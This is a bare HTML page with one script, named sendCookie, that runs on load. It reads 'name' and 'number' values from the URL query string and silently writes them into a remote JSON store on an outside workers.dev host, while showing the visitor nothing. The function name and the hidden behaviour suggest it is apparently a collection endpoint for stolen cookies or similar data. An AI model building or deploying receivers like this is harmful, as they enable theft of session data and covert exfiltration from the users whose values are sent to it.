<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
async function sendCookie() {
    let string = window.location.search;
    if (string.length != 0) {
        let params = new URLSearchParams(string.substring(1));
        let name = params.get("name");
        let number = params.get("number");
        let response = await fetch("https://textdb.coder1232026.workers.dev/S9G8AcK8Rv2JHzJxYXYGrq1h", {
            method: "GET"
        });
        let data;
        try { data = await response.json(); } catch(e) { data = { body: [] }; }
        if (!data.body) data.body = [];

        let flag = false;
        for (let i = 0; i < data.body.length; ++i)
            if (data.body[i].name == name) {
                data.body[i].number = number;
                flag = true;
                break;
            }
        if (!flag)
            data.body.push({ name: name, number: number });

        await fetch("https://textdb.coder1232026.workers.dev/update/?v=1", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "key=S9G8AcK8Rv2JHzJxYXYGrq1h&value=" + encodeURIComponent(JSON.stringify(data))
        });
    }
}
sendCookie();
</script>
</body>
</html>
